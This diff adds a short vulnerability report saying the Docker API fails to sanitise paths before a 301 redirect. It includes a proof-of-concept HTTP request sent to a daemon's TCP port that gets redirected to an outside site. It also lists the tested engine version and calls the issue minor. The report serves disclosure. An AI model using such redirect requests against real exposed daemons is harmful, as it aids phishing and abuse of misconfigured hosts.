@@ -1,0 +1,30 @@
+Docker Registry API Doesn't Sanitise `Location' Header
+
+
+It was discovered that Docker API did not properly sanitise the resource path before serving a 301 redirect response.
+Proof Of Concept:
+REQUEST:
+GET https://www.google.com HTTP/1.1
+Host: 172.17.0.1:2375
+
+RESPONSE:
+HTTP/1.1 301 Moved Permanently
+Location: https://www.google.com/
+Date: Mon, 19 Feb 2018 11:30:01 GMT
+Content-Length: 0
+Content-Type: text/plain; charset=utf-8
+
+Note: The Docker API are NOT supposed to be called in a browser, so this issue should be considered as a minor one. In addition, exposing the API on a TCP socket is NEVER recommended!
+Tested on:
+Server:
+ Engine:
+  Version:    17.12.0-ce
+  API version:    1.35 (minimum version 1.12)
+  Go version:    go1.9.2
+  Git commit:    c97c6d6
+  Built:    Wed Dec 27 20:09:54 2017
+  OS/Arch:    linux/amd64
+  Experimental:    false
+
+If you need any other information I may have missed, let me know,
+Thanks,
